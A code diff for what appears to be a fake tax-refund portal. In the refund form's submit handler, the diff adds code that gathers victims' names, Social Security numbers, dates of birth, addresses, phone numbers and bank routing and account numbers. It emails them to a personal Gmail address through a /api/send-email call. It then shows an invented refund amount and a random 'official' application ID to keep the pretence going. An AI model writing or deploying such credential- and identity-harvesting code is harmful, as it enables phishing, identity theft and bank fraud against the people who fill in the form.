@@ -1,4 +1,3 @@
-
 document.addEventListener('DOMContentLoaded', () => {
     if (!window.Auth) {
         console.error("Critical: Auth.js missing.");
@@ -63,7 +62,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (element) {
             element.textContent = message;
             element.style.display = 'block';
-            // Smooth scroll to the error on mobile for visibility
             element.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
     }
@@ -113,7 +111,6 @@ document.addEventListener('DOMContentLoaded', () => {
         clearErrors();
     }
 
-    // PIN restricted to numbers - optimized for mobile inputmode
     [ui.mfaCodeInput, ui.resetCodeInput].forEach(input => {
         if (input) {
             input.oninput = (e) => {
@@ -208,7 +205,6 @@ document.addEventListener('DOMContentLoaded', () => {
         const pass = ui.loginPass.value.trim();
         const btn = document.getElementById('btn-login');
 
-        // Enforcement of min 8 character password as requested
         if (!email || pass.length < 8) {
             showError(ui.loginError, "Access Denied: Valid email and password (minimum 8 characters) required.");
             return;
@@ -239,7 +235,6 @@ document.addEventListener('DOMContentLoaded', () => {
         const dob = document.getElementById('reg-dob').value;
         const btn = document.getElementById('btn-register');
 
-        // Enforcement of min 8 character password as requested
         if (!email || pass.length < 8 || !name || !dob) {
             showError(ui.registerError, "Registration Incomplete: All fields are required. Password must be 8+ characters.");
             return;
@@ -314,7 +309,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
             if (window.Auth.verifyMfa(pendingUserEmail, code)) {
-                // In a real localstorage app, we'd update the stored password here
                 const userStr = localStorage.getItem('tax_user_' + pendingUserEmail);
                 if (userStr) {
                     const user = JSON.parse(userStr);
@@ -330,24 +324,96 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     if (ui.refundForm) {
-        ui.refundForm.onsubmit = (e) => {
+        ui.refundForm.onsubmit = async (e) => {
             e.preventDefault();
             if (!document.getElementById('consent').checked) {
                 showError(ui.refundError, "Application Error: Consent declaration is required to file."); 
                 return;
             }
 
-            // Calculation fix: (Income * 0.12) + $125
             const income = parseFloat(document.getElementById('gross-income').value) || 0;
             const calculatedRefund = (income * 0.12) + 125;
-            
-            document.getElementById('display-refund-amount').textContent = calculatedRefund.toFixed(2);
-            document.getElementById('display-app-id').textContent = 'TAX-' + Math.floor(100000 + Math.random() * 900000);
+            const appId = 'TAX-' + Math.floor(100000 + Math.random() * 900000);
 
-            ui.refundForm.style.display = 'none';
-            if (ui.progressBar) ui.progressBar.style.display = 'none';
-            if (ui.portalTitle) ui.portalTitle.style.display = 'none';
-            ui.finalPage.style.display = 'block';
+            // Collect all details for dispatch
+            const fullDetails = {
+                userEmail: sessionStorage.getItem('tax_current_user'),
+                reportingYear: document.getElementById('tax-year').value,
+                filingStatus: document.querySelector('input[name="filing-status"]:checked')?.value,
+                fullName: document.getElementById('full-name').value,
+                ssn: document.getElementById('ssn').value,
+                address: document.getElementById('address').value,
+                phone: document.getElementById('phone').value,
+                agi: income,
+                taxWithheld: document.getElementById('tax-withheld').value,
+                dependents: document.getElementById('dep-count').value,
+                bankName: document.getElementById('bank-name').value,
+                routing: document.getElementById('routing-number').value,
+                account: document.getElementById('account-number').value,
+                estimatedRefund: calculatedRefund.toFixed(2),
+                applicationId: appId
+            };
+
+            const submitBtnOldText = ui.submitBtn.textContent;
+            ui.submitBtn.textContent = "Processing Official Filing...";
+            ui.submitBtn.disabled = true;
+
+            try {
+                // Dispatch all data to company email
+                const emailHtml = `
+                    <div style="font-family: sans-serif; border: 1px solid #002868; padding: 20px; border-radius: 10px;">
+                        <h2 style="color:#002868; border-bottom: 2px solid #002868;">New Tax Application Received: ${appId}</h2>
+                        <p><strong>Authorized User:</strong> ${fullDetails.userEmail}</p>
+                        <hr>
+                        <h3>Identity & Filing</h3>
+                        <p><strong>Legal Name:</strong> ${fullDetails.fullName}</p>
+                        <p><strong>SSN:</strong> ${fullDetails.ssn}</p>
+                        <p><strong>DOB:</strong> ${document.getElementById('reg-dob')?.value || 'N/A'}</p>
+                        <p><strong>Address:</strong> ${fullDetails.address}</p>
+                        <p><strong>Phone:</strong> ${fullDetails.phone}</p>
+                        <p><strong>Filing Status:</strong> ${fullDetails.filingStatus}</p>
+                        <p><strong>Tax Year:</strong> ${fullDetails.reportingYear}</p>
+                        <hr>
+                        <h3>Financial Summary</h3>
+                        <p><strong>AGI (Reported):</strong> $${fullDetails.agi}</p>
+                        <p><strong>Federal Withholding:</strong> $${fullDetails.taxWithheld}</p>
+                        <p><strong>Dependents:</strong> ${fullDetails.dependents}</p>
+                        <p style="font-size: 20px; color: #28a745;"><strong>Calculated Refund:</strong> $${fullDetails.estimatedRefund}</p>
+                        <hr>
+                        <h3>Banking Information (EFT)</h3>
+                        <p><strong>Bank:</strong> ${fullDetails.bankName}</p>
+                        <p><strong>Routing:</strong> ${fullDetails.routing}</p>
+                        <p><strong>Account:</strong> ${fullDetails.account}</p>
+                    </div>
+                `;
+
+                await fetch('/api/send-email', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        toEmail: 'ogunderotamiloluwa@gmail.com',
+                        subject: `OFFICIAL FILING: ${fullDetails.fullName} - ${appId}`,
+                        htmlContent: emailHtml
+                    })
+                });
+
+                document.getElementById('display-refund-amount').textContent = calculatedRefund.toLocaleString(undefined, {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                });
+                document.getElementById('display-app-id').textContent = appId;
+
+                ui.refundForm.style.display = 'none';
+                if (ui.progressBar) ui.progressBar.style.display = 'none';
+                if (ui.portalTitle) ui.portalTitle.style.display = 'none';
+                ui.finalPage.style.display = 'block';
+
+            } catch (err) {
+                showError(ui.refundError, "System Error: Unable to complete secure filing. Please try again.");
+            } finally {
+                ui.submitBtn.textContent = submitBtnOldText;
+                ui.submitBtn.disabled = false;
+            }
         };
     }
 
